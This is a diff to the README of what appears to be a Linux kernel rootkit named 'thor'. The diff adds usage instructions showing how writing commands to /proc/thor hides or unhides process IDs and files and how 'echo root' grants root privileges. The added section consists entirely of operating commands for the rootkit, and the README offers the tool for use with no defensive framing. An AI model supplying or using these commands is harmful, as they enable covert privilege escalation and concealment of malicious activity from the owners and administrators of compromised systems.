@@ -13,7 +13,14 @@ target kernel. Or you could simply change the `Makefile`.
 
 ## How to Use
 
-TODO
+    usage:
+       echo hp PID  > /proc/thor     (hides process PID)
+       echo up PID  > /proc/thor     (unhides process PID)
+       echo upa     > /proc/thor     (unhide all PIDs)
+       echo hf FILE > /proc/thor     (hide file FILE)
+       echo uf FILE > /proc/thor     (unhide file FILE)
+       echo ufa     > /proc/thor     (unhide all files)
+       echo root    > /proc/thor     (gain root privileges)
 
 ## Acknowledgement
 
